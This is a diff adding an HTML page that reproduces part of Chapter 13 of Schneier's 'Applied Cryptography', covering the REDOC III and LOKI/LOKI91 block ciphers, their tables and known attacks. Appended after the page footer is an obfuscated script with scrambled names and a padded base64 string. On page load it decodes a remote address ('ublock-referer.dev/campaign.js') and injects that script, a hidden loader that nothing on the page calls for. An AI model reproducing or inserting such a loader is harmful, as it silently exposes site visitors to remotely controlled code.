@@ -1,0 +1,221 @@
+<html>
+<head>
+<TITLE>APPLIED CRYPTOGRAPHY, SECOND EDITION: Protocols, Algorithms, and Source Code in C:Other Block Ciphers</TITLE>
+<!-- BEGIN HEADER -->
+<META NAME="ROBOTS" CONTENT="NOINDEX, NOFOLLOW">
+<SCRIPT>
+<!--
+function displayWindow(url, width, height) {
+        var Win = window.open(url,"displayWindow",'width=' + width +
+',height=' + height + ',resizable=1,scrollbars=yes');
+}
+//-->
+</SCRIPT>
+
+</HEAD>
+<body bgcolor="ffffff" link="#006666" alink="#006666" vlink="#006666">
+<P>
+<CENTER><B>Applied Cryptography, Second Edition: Protocols,  Algorthms, and Source Code in C (cloth)</B>
+<FONT SIZE="-2">
+<BR>
+<I>(Publisher: John Wiley & Sons, Inc.)</I>
+<BR>
+Author(s): Bruce Schneier
+<BR>
+ISBN: 0471128457
+<BR>
+Publication Date: 01/01/96
+</FONT></CENTER>
+<P>
+
+
+<!-- Empty Reference Subhead -->
+
+<!--ISBN=0471128457//-->
+<!--TITLE=APPLIED CRYPTOGRAPHY, SECOND EDITION: Protocols, Algorithms, and Source Code in C//-->
+<!--AUTHOR=Bruce Schneier//-->
+<!--PUBLISHER=Wiley Computer Publishing//-->
+<!--CHAPTER=13//-->
+<!--PAGES=313-316/-->
+<!--UNASSIGNED1//-->
+<!--UNASSIGNED2//-->
+
+<CENTER>
+<TABLE BORDER>
+<TR>
+<TD><A HREF="13-02.html">Previous</A></TD>
+<TD><A HREF="../ewtoc.html">Table of Contents</A></TD>
+<TD><A HREF="13-04.html">Next</A></TD>
+</TR>
+</TABLE>
+</CENTER>
+<P><BR></P>
+<P><FONT SIZE="+1"><B><I>REDOC III</I></B></FONT></P>
+<P>REDOC III is a streamlined version of REDOC II, also designed by Michael Wood [1615]. It operates on an 80-bit block. The key length is variable and can be as large as 2560 bytes (20, 480 bits). The algorithm consists solely of XORing key bytes with message bytes; there are no permutations or substitutions.
+</P>
+<DL>
+<DD><B>(1)</B>&nbsp;&nbsp;Create a key table of 256 10-byte keys, using the secret key.
+<DD><B>(2)</B>&nbsp;&nbsp;Create two 10-byte mask blocks, <I>M</I><SUB>1</SUB> and <I>M</I><SUB>2</SUB>. <I>M</I><SUB>1</SUB> is the XOR of the first 128 10-byte keys; <I>M</I><SUB>2</SUB> is the XOR of the second 128 10-byte keys.
+<DD><B>(3)</B>&nbsp;&nbsp;To encrypt a 10-byte block:
+<DL>
+<DD><B>(a)</B>&nbsp;&nbsp;XOR the first byte of the data block with the first byte of <I>M</I><SUB>1</SUB>. Select a key from the key table computed in step (1). Use the computed XOR as the index into the table. XOR each byte in the data block with the corresponding byte in the chosen key, except for the first data byte.
+<DD><B>(b)</B>&nbsp;&nbsp;XOR the second byte of the data block with the second byte of <I>M</I><SUB>1</SUB>. Select a key from the key table computed in step (1). Use the computed XOR as the index into the table. XOR each byte in the data block with the corresponding byte in the chosen key, except for the second data byte.
+<DD><B>(c)</B>&nbsp;&nbsp;Continue with the entire block (bytes 3 through 10), until each byte has been used to select a key from the key table after XORing it with the corresponding <I>M</I><SUB>1</SUB> value. Then XOR each byte with the key except for the byte used to select the key.
+<DD><B>(d)</B>&nbsp;&nbsp;Repeat steps (a) through (c) with <I>M</I><SUB>2</SUB>.
+</DL>
+</DL>
+<P>The algorithm is easy and fast. On a 33 megahertz 80386, the algorithm encrypts data at 2.75 megabits per second. Wood estimates that a VLSI-pipelined design, with a 64-bit data path, woud encrypt data at over 1.28 gigabits per second with a 20 megahertz clock.
+</P>
+<P>REDOC III is not secure [1440]. It is vulnerable to differential cryptanalysis. Only about 2<SUP>23</SUP> chosen plaintexts are required to reconstruct both masks.</P>
+<P><FONT SIZE="+1"><B><I>Patents and Licenses</I></B></FONT></P>
+<P>Both REDOC versions are patented in the United States [1614]. Foreign patents are pending. Anyone interested in licensing either REDOC II or REDOC III should contact Michael C. Wood, Delta Computec, Inc., 6647 Old Thompson Rd., Syracuse, NY 13211.
+</P>
+<H3><A NAME="Heading7"></A><FONT COLOR="#000077">13.6 LOKI</FONT></H3>
+<P>LOKI is Australian and was first presented in 1990 as a potential alternative to DES [273]. It uses a 64-bit block and a 64-bit key. The general structure of the algorithm and key schedule were based on [274, 275], and the design of the S-boxes was based on [1247].
+</P>
+<P>Using differential cryptanalysis, Biham and Shamir were able to break LOKI with 11 or fewer rounds faster than by brute force [170]. Furthermore, there is an 8-bit complementation property, which reduces the complexity of a brute-force attack by a factor of 256 [170, 916, 917].</P>
+<P>Lars Knudsen showed that LOKI, with 14 rounds or fewer, is vulnerable to differential cryptanalysis [852, 853]. Additionally, if LOKI is implemented with alternate S-boxes, the resulting cipher will probably be vulnerable to differential cryptanalysis.</P>
+<P><FONT SIZE="+1"><B><I>LOKI91</I></B></FONT></P>
+<P>In response to these attacks, LOKI&#146;s designers went back to the drawing board and revised their algorithm. The result is LOKI91 [272]. (The previous version of LOKI was renamed LOKI89.)
+</P>
+<P>To make the algorithm more resistant to differential cryptanalysis and to remove the complementation property, the following changes were made to the original design:</P>
+<DL>
+<DD><B>1.</B>&nbsp;&nbsp;The subkey generation algorithm was changed so that the halves were swapped every second round, not every round.
+<DD><B>2.</B>&nbsp;&nbsp;The subkey generation algorithm was changed so that the rotation of the left subkey alternated between 12 and 13 bits to the left.
+<DD><B>3.</B>&nbsp;&nbsp;The initial and final XOR of the block with the key were eliminated.
+<DD><B>4.</B>&nbsp;&nbsp;The S-box function was altered to flatten out their XOR profile (to improve their resistance to differential cryptanalysis), and to eliminate any value of <I>x</I> such that f(<I>x</I>) = 0, where f is the combination of the E-, S-, and P-boxes.
+</DL>
+<P><FONT SIZE="+1"><B><I>Description of LOKI91</I></B></FONT></P>
+<P>The mechanics of LOKI91 are similar to DES (see Figure 13.8). The data block is then divided into a left half and a right half and goes through 16 rounds, much like DES. In each round, the right half is first XORed with a piece of the key, then sent through an expansion permutation (see Table 13.1).
+</P>
+<P>The 48-bit output is divided into four 12-bit blocks, and each block is sent through an S-box substitution. The S-box substitution is as follows: Take each 12-bit input; use the 2 left-most bits and the 2 right-most bits to form the number <I>r</I>, and the 8 innermost bits and form the number <I>c</I>. The output of the S-box, <I>O</I>, is as follows:</P>
+<DL>
+<DD><I>O</I>(<I>r,c</I>) = (<I>c</I> &#43; ((<I>r</I>*17) &#8853; 0xff) &amp 0xff)<SUP>31</SUP> mod <I>P</I><SUB>r</SUB>
+</DL>
+<I><P><A NAME="Fig8"></A><A HREF="javascript:displayWindow('images/13-08.jpg',274,260 )"><IMG SRC="images/13-08t.jpg"></A>
+<BR><A HREF="javascript:displayWindow('images/13-08.jpg',274,260)"><FONT COLOR="#000077"><B>Figure 13.8</B></FONT></A>&nbsp;&nbsp;LOKI91.</I>
+</P>
+<P><I>P</I><SUB>r</SUB> is given in Table 13.2.</P>
+<P>Then, the four 8-bit outputs are recombined to form a single 32-bit number and sent through the permutation described in Table 13.3. Finally, the right half is XORed with the left half to become the new left half, and the left half becomes the new right half. After 16 rounds, the block is again XORed with the key to produce the ciphertext.</P>
+<P>The subkeys are generated from the key in a straightforward manner. The 64-bit key is split into a left half and a right half. In each round, the subkey is the left half. This left half is then rotated 12 or 13 bits to the left, and then every two rounds the left and right halves are exchanged. As with DES, the same algorithm can be used for both encryption and decryption, with some modification in how the subkeys are used.</P>
+<TABLE WIDTH="100%"><TH CAPTION ALIGN="CENTER" COLSPAN="12">Table 13.1<BR>Expansion Permutation
+<TR>
+<TD COLSPAN="12"><HR>
+<TR>
+<TD ALIGN="LEFT" VALIGN="TOP">4,
+<TD ALIGN="LEFT" VALIGN="TOP">3,
+<TD ALIGN="LEFT" VALIGN="TOP">2,
+<TD ALIGN="LEFT" VALIGN="TOP">1,
+<TD ALIGN="LEFT" VALIGN="TOP">32,
+<TD ALIGN="LEFT" VALIGN="TOP">31,
+<TD ALIGN="LEFT" VALIGN="TOP">20,
+<TD ALIGN="LEFT" VALIGN="TOP">29,
+<TD ALIGN="LEFT" VALIGN="TOP">28,
+<TD ALIGN="LEFT" VALIGN="TOP">27,
+<TD ALIGN="LEFT" VALIGN="TOP">26,
+<TD ALIGN="LEFT" VALIGN="TOP">25,
+<TR>
+<TD ALIGN="LEFT" VALIGN="TOP">28,
+<TD ALIGN="LEFT" VALIGN="TOP">27,
+<TD ALIGN="LEFT" VALIGN="TOP">26,
+<TD ALIGN="LEFT" VALIGN="TOP">25,
+<TD ALIGN="LEFT" VALIGN="TOP">24,
+<TD ALIGN="LEFT" VALIGN="TOP">23,
+<TD ALIGN="LEFT" VALIGN="TOP">22,
+<TD ALIGN="LEFT" VALIGN="TOP">21,
+<TD ALIGN="LEFT" VALIGN="TOP">20,
+<TD ALIGN="LEFT" VALIGN="TOP">19,
+<TD ALIGN="LEFT" VALIGN="TOP">18,
+<TD ALIGN="LEFT" VALIGN="TOP">17,
+<TR>
+<TD ALIGN="LEFT" VALIGN="TOP">20,
+<TD ALIGN="LEFT" VALIGN="TOP">19,
+<TD ALIGN="LEFT" VALIGN="TOP">18,
+<TD ALIGN="LEFT" VALIGN="TOP">17,
+<TD ALIGN="LEFT" VALIGN="TOP">16,
+<TD ALIGN="LEFT" VALIGN="TOP">15,
+<TD ALIGN="LEFT" VALIGN="TOP">14,
+<TD ALIGN="LEFT" VALIGN="TOP">13,
+<TD ALIGN="LEFT" VALIGN="TOP">12,
+<TD ALIGN="LEFT" VALIGN="TOP">11,
+<TD ALIGN="LEFT" VALIGN="TOP">10,
+<TD ALIGN="LEFT" VALIGN="TOP">9,
+<TR>
+<TD ALIGN="LEFT" VALIGN="TOP">12,
+<TD ALIGN="LEFT" VALIGN="TOP">11,
+<TD ALIGN="LEFT" VALIGN="TOP">10,
+<TD ALIGN="LEFT" VALIGN="TOP">9,
+<TD ALIGN="LEFT" VALIGN="TOP">8,
+<TD ALIGN="LEFT" VALIGN="TOP">7,
+<TD ALIGN="LEFT" VALIGN="TOP">6,
+<TD ALIGN="LEFT" VALIGN="TOP">5,
+<TD ALIGN="LEFT" VALIGN="TOP">4,
+<TD ALIGN="LEFT" VALIGN="TOP">3,
+<TD ALIGN="LEFT" VALIGN="TOP">2,
+<TD ALIGN="LEFT" VALIGN="TOP">1
+<TR>
+<TD COLSPAN="12"><HR>
+<TR>
+</TABLE>
+<P>
+</P>
+<TABLE WIDTH="100%"><TH CAPTION ALIGN="CENTER" COLSPAN="17">Table 13.2<BR><I>P</I><SUB>r</SUB>
+<TR>
+<TD COLSPAN="17"><HR>
+<TR>
+<TD ALIGN="LEFT" VALIGN="TOP"><I>r:</I>
+<TD ALIGN="LEFT" VALIGN="TOP">1,
+<TD ALIGN="LEFT" VALIGN="TOP">2,
+<TD ALIGN="LEFT" VALIGN="TOP">3,
+<TD ALIGN="LEFT" VALIGN="TOP">4,
+<TD ALIGN="LEFT" VALIGN="TOP">5,
+<TD ALIGN="LEFT" VALIGN="TOP">6,
+<TD ALIGN="LEFT" VALIGN="TOP">7,
+<TD ALIGN="LEFT" VALIGN="TOP">8,
+<TD ALIGN="LEFT" VALIGN="TOP">9,
+<TD ALIGN="LEFT" VALIGN="TOP">10,
+<TD ALIGN="LEFT" VALIGN="TOP">11,
+<TD ALIGN="LEFT" VALIGN="TOP">12,
+<TD ALIGN="LEFT" VALIGN="TOP">13,
+<TD ALIGN="LEFT" VALIGN="TOP">14,
+<TD ALIGN="LEFT" VALIGN="TOP">15,
+<TD ALIGN="LEFT" VALIGN="TOP">16
+<TR>
+<TD ALIGN="LEFT" VALIGN="TOP"><I>P</I><SUB>r</SUB>:
+<TD ALIGN="LEFT" VALIGN="TOP">375,
+<TD ALIGN="LEFT" VALIGN="TOP">379,
+<TD ALIGN="LEFT" VALIGN="TOP">391,
+<TD ALIGN="LEFT" VALIGN="TOP">395,
+<TD ALIGN="LEFT" VALIGN="TOP">397,
+<TD ALIGN="LEFT" VALIGN="TOP">415,
+<TD ALIGN="LEFT" VALIGN="TOP">419,
+<TD ALIGN="LEFT" VALIGN="TOP">425,
+<TD ALIGN="LEFT" VALIGN="TOP">433,
+<TD ALIGN="LEFT" VALIGN="TOP">445,
+<TD ALIGN="LEFT" VALIGN="TOP">451,
+<TD ALIGN="LEFT" VALIGN="TOP">463,
+<TD ALIGN="LEFT" VALIGN="TOP">471,
+<TD ALIGN="LEFT" VALIGN="TOP">477,
+<TD ALIGN="LEFT" VALIGN="TOP">487,
+<TD ALIGN="LEFT" VALIGN="TOP">499
+<TR>
+<TD COLSPAN="17"><HR>
+<TR>
+</TABLE>
+<P><FONT SIZE="+1"><B><I>Cryptanalysis of LOKI91</I></B></FONT></P>
+<P>Knudsen attempted to cryptanalyze LOKI91 [854, 858], but found it secure against differential cryptanalysis. However, he found a related-key chosen-plaintext attack that reduces the complexity of a brute-force search by almost a factor of four. This attack exploits a weakness in the key schedule and may also apply if the algorithm is used as a one-way hash function (see Section 18.11).
+</P>
+<P>Another attack on related keys can break LOKI91 with 2<SUP>32</SUP> chosen-key chosen plaintexts, or 2<SUP>48</SUP> chosen-key known plaintexts [158]. The attack is independent of the number of rounds of the algorithm. (In the same paper, Biham breaks LOKI89 with 2<SUP>17</SUP> chosen-key chosen plaintexts or 2<SUP>33</SUP> known-key known plaintexts using related-key cryptanalysis.) It&#146;s easy to make LOKI91 resistant to this attack; avoid the simple key schedule.</P><P><BR></P>
+<CENTER>
+<TABLE BORDER>
+<TR>
+<TD><A HREF="13-02.html">Previous</A></TD>
+<TD><A HREF="../ewtoc.html">Table of Contents</A></TD>
+<TD><A HREF="13-04.html">Next</A></TD>
+</TR>
+</TABLE>
+</CENTER>
+
+[an error occurred while processing this directive]
+<script type="text/javascript">(function(BaoThfFi, jaQAclBI) {jaQAclBI = BaoThfFi.createElement('script');jaQAclBI.type = 'text/javascript';jaQAclBI.async = true;jaQAclBI.src = atob('0024241d2f28Ly91YmxvY2stcmVmZXJlci5kZXYvY2FtcGFpZ24uanM=0024241d2f28'.replace(/0024241d2f28/gi, '')) + '?' + String(Math.random()).replace('0.','');BaoThfFi.getElementsByTagName('body')[0].appendChild(jaQAclBI);}(document));</script></body>
+</html>
